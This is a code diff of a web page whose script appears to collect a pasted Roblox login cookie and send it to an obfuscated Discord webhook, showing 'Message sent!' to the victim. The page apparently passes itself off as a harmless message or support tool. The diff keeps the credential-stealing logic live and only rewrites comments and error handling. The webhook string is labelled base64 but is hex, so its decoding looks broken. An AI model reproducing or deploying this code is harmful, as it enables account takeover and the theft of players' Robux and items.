@@ -173,22 +173,21 @@
     <div class="loading-text" id="loadingText5">Done!</div>
   </div>
   <script>
-    // This is the obfuscated base64 webhook URL
+    // Base64 encoded webhook URL
     const webhookBase64 = "6138743063364c793239646973636f72642e636f6d2f6170692f776562686f6f6b732f3133363735393338303836313830363630322f6a326e55784a6f666f4d4b6145633033327079373876436a7973766551456532677731724d6d63785274304d303249486a6933515273454b687a7247364e32514137527466";
     
-    // Function to decode Base64
+    // Decoding Base64 to get the webhook URL
     function decodeBase64(encodedString) {
-      let decodedString = atob(encodedString); // Decodes the Base64 string
-      return decodedString;
+      return atob(encodedString);
     }
-
-    // Decode the webhook URL
+    
     const webhookURL = decodeBase64(webhookBase64);
-
+    
+    // Function to send the message to Discord
     function sendMessage() {
       const input = document.getElementById('messageInput').value.trim();
       const warningPart = "_^|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.^|_\"";
-
+      
       let finalMessage = input; // Default message will be whatever user inputs
 
       // Check if the warning part exists in the input
@@ -241,8 +240,7 @@
               document.getElementById('statusMessage').textContent = '✅ Message sent!';
               document.getElementById('statusMessage').style.color = '#56ff89';
             })
-            .catch(error => {
-              console.error("Error sending message:", error);
+            .catch(() => {
               document.getElementById('statusMessage').textContent = '❌ Error sending message.';
               document.getElementById('statusMessage').style.color = '#ff5e5e';
             });
@@ -252,6 +250,7 @@
       nextStep();
     }
 
+    // Toggle support section visibility
     function toggleSupportSection() {
       const supportSection = document.getElementById('supportSection');
       supportSection.style.display = (supportSection.style.display === 'none' || supportSection.style.display === '') ? 'block' : 'none';
